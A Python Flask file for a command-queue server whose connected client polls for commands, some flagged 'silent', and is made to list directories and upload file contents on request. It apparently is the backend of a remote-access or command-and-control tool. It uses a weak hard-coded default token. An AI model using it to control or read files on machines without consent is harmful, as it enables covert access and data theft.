from flask import Flask, request, jsonify
from collections import deque
import os

app = Flask(__name__)

command_queue = deque()
TOKEN = os.environ.get("RC_TOKEN", "changeme123")

file_tree = {}
file_cache = {}


def check_token(req):
    return req.headers.get("X-Token") == TOKEN


@app.route("/send", methods=["POST"])
def send_command():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "command" not in data: return jsonify({"error": "Missing command"}), 400
    command_queue.append({"command": data["command"], "silent": data.get("silent", False)})
    return jsonify({"ok": True})


@app.route("/poll", methods=["GET"])
def poll():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    if command_queue:
        item = command_queue.popleft()
        return jsonify({"command": item["command"], "silent": item["silent"]})
    return jsonify({"command": None})


@app.route("/fs/list", methods=["GET"])
def fs_list_get():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    path = request.args.get("path", "/")
    entries = file_tree.get(path)
    if entries is None:
        command_queue.appendleft({"command": f"rc-ls:{path}", "silent": True})
        return jsonify({"entries": None, "pending": True})
    return jsonify({"entries": entries, "pending": False})


@app.route("/fs/list", methods=["POST"])
def fs_list_post():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if data:
        file_tree[data.get("path", "/")] = data.get("entries", [])
    return jsonify({"ok": True})


@app.route("/fs/file", methods=["GET"])
def fs_file_get():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    path = request.args.get("path", "")
    content = file_cache.get("file:" + path)
    if content is None:
        command_queue.appendleft({"command": f"rc-get:{path}", "silent": True})
        return jsonify({"content": None, "pending": True})
    return jsonify({"content": content, "name": path.split("/")[-1]})


@app.route("/fs/file", methods=["POST"])
def fs_file_post():
    if not check_token(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if data:
        file_cache["file:" + data.get("path", "")] = data.get("content", "")
    return jsonify({"ok": True})


@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "ok", "queued": len(command_queue)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
